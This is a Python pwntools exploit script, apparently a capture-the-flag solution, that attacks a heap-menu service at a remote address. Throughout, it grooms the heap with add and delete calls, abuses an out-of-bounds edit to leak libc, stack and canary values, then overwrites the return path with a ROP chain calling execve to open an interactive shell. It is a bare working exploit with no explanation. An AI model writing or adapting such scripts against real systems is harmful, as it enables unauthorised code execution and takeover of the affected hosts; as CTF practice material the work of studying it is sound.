#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from pwn import *
context.clear(arch='amd64', os='linux', log_level='info')

def add():
    sh.sendlineafter(b'your choice: ', b'1')

def edit(index, offset, content):
    sh.sendlineafter(b'your choice: ', b'2')
    sh.sendlineafter(b'idx: ', str(index).encode())
    sh.sendlineafter(b'offset: ', str(offset).encode())
    sh.sendlineafter(b'data: ', content)

def show(index):
    sh.sendlineafter(b'your choice: ', b'3')
    sh.sendlineafter(b'read?\n', str(index).encode())

def delete(index):
    sh.sendlineafter(b'your choice: ', b'4')
    sh.sendlineafter(b'destroy?\n', str(index).encode())

sh = remote('8.130.35.16', 58000)

add()
add()
add()
add()
add()
add()
add()
delete(1)
delete(2)
delete(3)
delete(4)
delete(5)
delete(6)
add()
add()
add()
add()
add()
add()

edit(0, 0x130, p64(0x405FC8))
edit(0, 0x130+8, p32(0x444))

edit(0, 0, cyclic(544) + p64(0x406429+0x18)[:6])
show(6)
sh.recvuntil(b'Data: ')
libc_addr = u64(sh.recvn(6) + b'\0\0') - 0xf87d0
success('libc_addr: ' + hex(libc_addr))

edit(0, 0x130, p64(libc_addr + 0x1da321))
edit(0, 0x130+8, p32(0x444))
show(6)
sh.recvuntil(b'Data: ')
stack_addr = u64(sh.recvn(5) + b'\0\0\0') * 0x100

find_stack = False
for i in range(0x18):
    edit(0, 0x130, p64(stack_addr + 0x11 + i * 8))
    edit(0, 0x130+8, p32(0x444))
    show(6)
    sh.recvuntil(b'Data: ')
    result = u64(sh.recvn(5) + b'\0\0\0') * 0x100
    info('result: ' + hex(result))
    if(result == libc_addr + 0x27200):
        stack_addr += 0x10 + i * 8
        success('stack_addr: ' + hex(stack_addr))
        find_stack = True
        break
if find_stack == False:
    raise EOFError("Invailed stack")

edit(0, 0x130, p64(stack_addr - 0x10 + 1))
edit(0, 0x130+8, p32(0x444))
show(6)
sh.recvuntil(b'Data: ')
canary = u64(b'\0' + sh.recvn(7))
success('canary: ' + hex(canary))

edit(0, 0, b'\0' * 0x10 + cyclic(504) + p64(canary) + flat(
[
    0,
    1,
    2,
    libc_addr + 0x0000000000027765,
    libc_addr + 0x196031,
    libc_addr + 0x0000000000028f19,
    0,
    libc_addr + 0x00000000000fdcfd,
    0,
    libc_addr + 0x000000000003f117,
    59,
    libc_addr + 0x0000000000086002,
]
))

sh.interactive()
